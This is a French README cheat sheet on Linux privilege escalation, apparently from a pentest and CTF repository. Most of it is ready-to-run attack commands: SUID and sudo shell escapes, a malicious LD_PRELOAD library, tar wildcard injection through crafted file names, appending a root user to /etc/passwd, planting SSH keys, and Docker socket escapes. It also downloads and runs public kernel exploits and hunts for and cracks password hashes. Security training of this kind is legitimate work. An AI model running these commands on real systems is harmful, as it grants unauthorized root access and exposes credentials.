# 🐧 Élévation de privilèges Linux — aide-mémoire complet

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗
  ██║     ██║████╗  ██║██║   ██║╚██╗██╔╝
  ██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝ 
  ██║     ██║██║╚██╗██║██║   ██║ ██╔██╗ 
  ███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗
  ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝
  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/Linux-PrivEsc-red?style=for-the-badge" alt="Élévation de privilèges Linux">
  <img src="https://img.shields.io/badge/Post-Exploitation-orange?style=for-the-badge" alt="Après exploitation">
  <img src="https://img.shields.io/badge/Root-Access-blue?style=for-the-badge" alt="Root">
  <img src="https://img.shields.io/badge/CTF-Ready-green?style=for-the-badge" alt="CTF">
</p>

<p align="center">
  <b>🔓 Guide complet de l’élévation de privilèges sur les systèmes Linux</b>
</p>

---

## 📋 Table des matières

- [Énumération](#-énumération)
- [SUID/SGID](#-suidsgid)
- [Capacités Linux (capabilities)](#-capacités-linux-capabilities)
- [Exploitation de sudo](#-exploitation-de-sudo)
- [Tâches cron](#-tâches-cron)
- [Détournement de PATH](#-détournement-de-path)
- [Restriction des droits root sur NFS (root squashing)](#-restriction-des-droits-root-sur-nfs-root-squashing)
- [Exploitation de vulnérabilités du noyau](#-exploitation-de-vulnérabilités-du-noyau)
- [Recherche de mots de passe](#-recherche-de-mots-de-passe)
- [Clés SSH](#-clés-ssh)
- [Fichiers modifiables](#-fichiers-modifiables)
- [Sortie d’un conteneur Docker](#-sortie-dun-conteneur-docker)
- [Référence rapide](#-référence-rapide)
- [Ressources](#-ressources)

---

## 🔍 Énumération

### Informations système

```bash
# Nom d’hôte
hostname

# Système et noyau
cat /etc/os-release
cat /etc/issue
uname -a
uname -r

# Architecture
arch
uname -m

# Informations sur le processeur
cat /proc/cpuinfo
lscpu
```

### Informations sur les utilisateurs

```bash
# Utilisateur actuel
whoami
id

# Tous les utilisateurs
cat /etc/passwd
cat /etc/passwd | grep -v "nologin\|false"

# Groupes d’utilisateurs
groups
cat /etc/group

# Utilisateurs connectés
w
who
users

# Dernières connexions
last
lastlog

# Autorisations sudo
sudo -l
```

### Informations réseau

```bash
# Adresses IP
ip a
ifconfig

# Routes
ip route
route -n

# Ports ouverts
netstat -tulpn
ss -tulpn

# Connexions actives
netstat -an
ss -an

# Cache ARP
arp -a
ip neigh

# DNS
cat /etc/resolv.conf

# Hôtes
cat /etc/hosts
```

### Processus et services

```bash
# Processus en cours
ps aux
ps -ef
ps aux | grep root

# Services
systemctl list-units --type=service
service --status-all

# Paquets installés
dpkg -l                    # Debian/Ubuntu
rpm -qa                    # RHEL/CentOS
```

### Tâches planifiées

```bash
# Tables cron
crontab -l
ls -la /etc/cron*
cat /etc/crontab
cat /etc/cron.d/*

# Minuteurs systemd
systemctl list-timers
```

---

## 🔐 SUID/SGID

> **Précision :** SUID/SGID modifie l’identité effective sous certaines conditions ; les shells peuvent abandonner ces droits. Linux ignore les bits SUID/SGID des scripts, et `nosuid` ou `no_new_privs` peuvent neutraliser cet effet. Les exemples, notamment le mode interactif historique de nmap, ne sont donc pas universels ([execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html)).

### Rechercher les exécutables SUID

```bash
# Rechercher les fichiers SUID
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Rechercher les fichiers SGID
find / -perm -2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# Rechercher les deux
find / -perm /6000 -type f 2>/dev/null
```

### Exécutables SUID souvent exploitables

Consulter [GTFOBins](https://gtfobins.github.io/) pour les méthodes d’exploitation !

#### **bash**
```bash
# Si bash possède le bit SUID
./bash -p
```

#### **find**
```bash
find . -exec /bin/sh -p \; -quit
```

#### **vim**
```bash
vim -c ':!/bin/sh'
```

#### **nmap** (anciennes versions)
```bash
nmap --interactive
!sh
```

#### **python**
```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

#### **perl**
```bash
perl -e 'exec "/bin/sh";'
```

#### **less/more**
```bash
less /etc/passwd
!/bin/sh
```

#### **cp**

> **Précision sur l’original :** la commande `echo` ci-dessous conserve littéralement la substitution `$(openssl ...)` entre apostrophes ; elle ne calcule pas l’empreinte. La sauvegarde est `/tmp/passwd.bak`, tandis que la copie finale lit `/tmp/passwd`. Ce bloc est conservé tel quel et ne constitue pas une procédure complète ([manuel Bash](https://www.gnu.org/s/bash/manual/bash.html)).
```bash
# Copier /etc/passwd, ajouter un utilisateur root, puis recopier le fichier
LFILE=/etc/passwd
cp /etc/passwd /tmp/passwd.bak
echo 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /tmp/passwd
cp /tmp/passwd $LFILE
```

#### **env**
```bash
env /bin/sh -p
```

---

## ⚡ Capacités Linux (capabilities)

> **Précision :** les capacités décomposent les privilèges en permissions distinctes. Leur effet dépend de l’ensemble effectif du processus et de son espace de noms utilisateur ; la présence d’une capacité sur un fichier ne garantit donc pas à elle seule un accès root sur l’hôte ([capabilities(7)](https://man7.org/linux/man-pages/man7/capabilities.7.html)).

### Rechercher les capacités

```bash
# Obtenir les capacités des fichiers
getcap -r / 2>/dev/null

# Capacités dangereuses courantes
# CAP_SETUID — changer d’UID
# CAP_NET_RAW — sockets brutes
# CAP_DAC_READ_SEARCH — lire n’importe quel fichier
```

### Exploiter les capacités

#### **Python (cap_setuid)**
```bash
# Si python possède cap_setuid+ep
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

#### **Perl (cap_setuid)**
```bash
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
```

#### **tar (cap_dac_read_search)**
```bash
# Lire n’importe quel fichier
tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar
cat etc/shadow
```

#### **vim (cap_setuid)**
```bash
vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

---

## 🔑 Exploitation de sudo

### Vérifier les autorisations sudo

```bash
sudo -l
# Rechercher les entrées NOPASSWD
# Rechercher les entrées (ALL) ou (root)
```

### Exploiter sudo

#### **sudo ALL**
```bash
sudo /bin/bash
sudo su
```

#### **LD_PRELOAD**
```bash
# Si env_keep+=LD_PRELOAD figure dans sudo -l
# Créer une bibliothèque malveillante

cat > /tmp/shell.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/any_allowed_program
```

#### **sudo vim**
```bash
sudo vim -c ':!/bin/sh'
```

#### **sudo less/more**
```bash
sudo less /etc/passwd
!/bin/sh
```

#### **sudo find**
```bash
sudo find /tmp -exec /bin/sh \;
```

#### **sudo nmap** (mode interactif)
```bash
sudo nmap --interactive
!sh
```

#### **sudo tar**
```bash
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

#### **sudo zip**
```bash
sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/sh"
```

#### **sudo env**
```bash
sudo env /bin/sh
```

#### **sudo awk**
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

#### **sudo man**
```bash
sudo man man
!/bin/sh
```

#### **sudo apache2**
```bash
sudo apache2 -f /etc/shadow
# Divulgue la première ligne de shadow
```

### Exploitation de versions vulnérables de sudo

> **Précision :** ces exemples concernent des versions anciennes ; les correctifs peuvent être rétroportés par la distribution. La ligne sudoedit illustre un déclenchement possible de corruption mémoire et ne suffit pas à démontrer une élévation de privilèges ([avis de Red Hat](https://access.redhat.com/security/vulnerabilities/RHSB-2021-002)).

```bash
# Vérifier la version
sudo --version

# CVE-2019-14287 (sudo < 1.8.28)
sudo -u#-1 /bin/bash

# CVE-2021-3156 (Baron Samedit)
# sudo 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
```

---

## ⏰ Tâches cron

### Rechercher les tâches cron

```bash
# Table cron du système
cat /etc/crontab

# Répertoires cron
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# Tables cron des utilisateurs
cat /var/spool/cron/crontabs/*

# Surveiller les tâches cron
# Utiliser pspy pour surveiller les processus
```

### Exploiter les tâches cron

#### **Script cron modifiable**
```bash
# Si cron exécute un script que vous pouvez modifier :
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /path/to/script.sh

# Attendre l’exécution de cron, puis :
/tmp/bash -p
```

#### **Injection par caractères génériques (tar)**
```bash
# Si cron exécute : tar czf /tmp/backup.tar.gz *

# Créer les fichiers malveillants
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > shell.sh
touch "/path/--checkpoint=1"
touch "/path/--checkpoint-action=exec=sh shell.sh"
```

#### **Exploitation de PATH**
```bash
# Si cron utilise un chemin relatif et que vous contrôlez PATH
# La table cron indique : PATH=/home/user:/usr/local/bin:...
# Le script appelle backup.sh (sans chemin complet)

# Créer un faux script dans un répertoire modifiable de PATH
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/backup.sh
chmod +x /home/user/backup.sh
```

---

<a id="-détournement-de-path"></a>
## 🛤️ Détournement de PATH

### Rechercher les scripts vulnérables

```bash
# Rechercher les scripts exécutés par root qui utilisent des chemins relatifs
# Vérifier les scripts SUID
# Vérifier les scripts cron
# Vérifier les services systemd
```

### Exploiter PATH

```bash
# Si un script root appelle 'service' sans chemin complet
# et que vous contrôlez PATH :

# Créer un programme 'service' malveillant
echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH

# Exécuter le script vulnérable
./vulnerable_script
```

---

## 📁 Restriction des droits root sur NFS (root squashing)

### Rechercher les partages NFS

```bash
# Sur la machine de l’attaquant
showmount -e target_ip

# Vérifier les exports
cat /etc/exports
# Rechercher no_root_squash
```

### Exploiter no_root_squash

```bash
# Sur la machine de l’attaquant (en tant que root) :
mkdir /tmp/nfs
mount -o rw target_ip:/share /tmp/nfs
cp /bin/bash /tmp/nfs/
chmod +s /tmp/nfs/bash

# Sur la cible :
/share/bash -p
```

---

## 💣 Exploitation de vulnérabilités du noyau

### Vérifier la version du noyau

```bash
uname -r
uname -a
cat /proc/version
```

### Vulnérabilités courantes du noyau

> **Précision :** le tableau original mélange des composants : PwnKit concerne `pkexec` de polkit, et Baron Samedit concerne sudo, pas le noyau. Les plages de versions sont indicatives et ne tiennent pas compte de tous les correctifs rétroportés ; vérifier les avis propres à la distribution ([PwnKit](https://access.redhat.com/security/vulnerabilities/RHSB-2022-001), [sudo](https://access.redhat.com/security/vulnerabilities/RHSB-2021-002)).

| CVE | Version du noyau | Nom |
|-----|----------------|------|
| CVE-2016-5195 | 2.x - 4.8.3 | **Dirty COW** |
| CVE-2021-4034 | Toutes | **PwnKit** |
| CVE-2021-3156 | sudo < 1.9.5p2 | **Baron Samedit** |
| CVE-2022-0847 | 5.8 - 5.16.11 | **Dirty Pipe** |
| CVE-2022-2588 | 5.x | **DirtyCred** |

### Dirty COW (CVE-2016-5195)
```bash
# Télécharger et compiler
wget https://www.exploit-db.com/download/40839
gcc -pthread 40839.c -o dirty -lcrypt
./dirty
```

### PwnKit (CVE-2021-4034)
```bash
# Télécharger
git clone https://github.com/ly4k/PwnKit
cd PwnKit
chmod +x PwnKit
./PwnKit
```

### Dirty Pipe (CVE-2022-0847)
```bash
# Vérifier d’abord la version du noyau
uname -r

# Télécharger et compiler
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh
./exploit-1
```

---

## 🔑 Recherche de mots de passe

### Rechercher des mots de passe

```bash
# Dans les fichiers
grep -r "password" /home/ 2>/dev/null
grep -r "pass" /etc/ 2>/dev/null
grep -ri "password" /var/www/ 2>/dev/null

# Fichiers de configuration
cat /var/www/html/wp-config.php
cat /var/www/html/config.php
cat /etc/mysql/my.cnf

# Fichiers d’historique
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.nano_history

# Environnement
env
printenv
```

### Fichiers de mots de passe

```bash
# Fichier shadow (droits root nécessaires)
cat /etc/shadow

# Empreintes de mots de passe provenant de shadow
unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt
```

### Emplacements courants

```bash
# Configurations web
/var/www/html/wp-config.php
/var/www/html/config.php
/var/www/html/.htpasswd

# Configurations des bases de données
/etc/mysql/my.cnf
/etc/postgresql/*/main/pg_hba.conf

# SSH
/home/*/.ssh/id_rsa
/root/.ssh/id_rsa

# Fichiers de sauvegarde
find / -name "*.bak" 2>/dev/null
find / -name "*.backup" 2>/dev/null
```

---

## 🔐 Clés SSH

### Rechercher des clés SSH

```bash
# Clés privées
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Clés autorisées
cat /home/*/.ssh/authorized_keys
cat /root/.ssh/authorized_keys
```

### Exploiter des clés SSH

```bash
# Si vous trouvez une clé privée lisible :
chmod 600 id_rsa
ssh -i id_rsa user@localhost
ssh -i id_rsa root@localhost
```

### Ajouter sa clé SSH

```bash
# Générer la clé sur la machine de l’attaquant
ssh-keygen -t rsa -b 4096

# Si vous pouvez modifier authorized_keys :
echo "YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys
echo "YOUR_PUBLIC_KEY" >> /home/user/.ssh/authorized_keys
```

---

## 📝 Fichiers modifiables

### Fichiers critiques modifiables

```bash
# Vérifier les autorisations d’écriture
ls -la /etc/passwd
ls -la /etc/shadow
ls -la /etc/sudoers
```

### Exploiter un fichier /etc/passwd modifiable

```bash
# Générer une empreinte de mot de passe
openssl passwd -1 -salt hacker password
# Résultat : $1$hacker$TzyKlv0/R/c28R.GAeLw.1

# Ajouter un utilisateur root
echo 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0::/root:/bin/bash' >> /etc/passwd

# Se connecter
su hacker
# Mot de passe : password
```

### Rechercher les fichiers modifiables par tous

> **Précision :** ces tests ne sont pas équivalents : `-writable` évalue l’accès de l’utilisateur courant, notamment selon les ACL ; `-perm -222` exige les trois bits d’écriture, tandis que `-perm -o+w` teste celui des autres utilisateurs ([GNU Findutils](https://www.gnu.org/software/findutils/manual/html_node/find_html/Mode-Bits.html)).

```bash
find / -writable -type f 2>/dev/null
find / -perm -222 -type f 2>/dev/null
find / -perm -o+w -type f 2>/dev/null

# Répertoires modifiables par tous
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
```

---

## 🐳 Sortie d’un conteneur Docker

> **Précision :** ces exemples dépendent des droits sur le démon/socket, des périphériques accessibles et des espaces de noms. Un démon Docker sans privilèges (*rootless*) ou un remappage d’UID change leur portée ; `root` dans le conteneur n’équivaut pas toujours à root sur l’hôte ([sécurité Docker](https://docs.docker.com/engine/security/), [mode rootless](https://docs.docker.com/engine/security/rootless/)).

### Vérifier la présence dans Docker

```bash
# Rechercher .dockerenv
ls -la /.dockerenv

# Vérifier les cgroups
cat /proc/1/cgroup | grep docker

# Vérifier le nom d’hôte (chaîne aléatoire)
hostname
```

### Socket Docker monté

```bash
# Si docker.sock est monté
find / -name docker.sock 2>/dev/null
ls -la /var/run/docker.sock

# Sortir du conteneur au moyen du socket Docker
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### Conteneur privilégié

```bash
# Si le conteneur est privilégié
fdisk -l                    # Afficher les disques de l’hôte
mount /dev/sda1 /mnt
chroot /mnt
```

---

## 📊 Référence rapide

### Énumération en une ligne

```bash
# Informations système rapides
id; hostname; uname -a; cat /etc/issue

# Recherche rapide des SUID
find / -perm -4000 -type f 2>/dev/null

# Recherche rapide des capacités
getcap -r / 2>/dev/null

# Vérification rapide de sudo
sudo -l

# Vérification rapide de cron
cat /etc/crontab; ls -la /etc/cron*

# Recherche rapide de mots de passe
grep -r "password" /home/ 2>/dev/null
```

### Outils d’automatisation

| Outil | Description |
|------|-------------|
| **LinPEAS** | Énumération approfondie |
| **LinEnum** | Énumération Linux |
| **linux-smart-enumeration** | LSE |
| **pspy** | Surveillance des processus |

### Liste des vérifications prioritaires

- [ ] `sudo -l` — Vérifier les autorisations sudo
- [ ] Exécutables SUID — Les rechercher et consulter GTFOBins
- [ ] Capacités — `getcap -r / 2>/dev/null`
- [ ] Tâches cron — Scripts modifiables ?
- [ ] Version du noyau — Vulnérabilités connues ?
- [ ] /etc/shadow lisible
- [ ] /etc/passwd modifiable
- [ ] Clés SSH dans /home/* ou /root
- [ ] Socket Docker monté
- [ ] NFS avec no_root_squash

---

## 📚 Ressources

- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks Linux PrivEsc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

### Aide-mémoire associés
- LinPEAS — guide pas encore disponible — cible absente de la copie du dépôt ; lien hérité conservé.
- [Élévation de privilèges Windows](../../Windows-PrivEsc/translations/README.fr.md)

---

<p align="center">
  <b>🐧 Obtenez les droits root !</b><br>
  <i>Maîtrisez l’élévation de privilèges Linux</i>
</p>
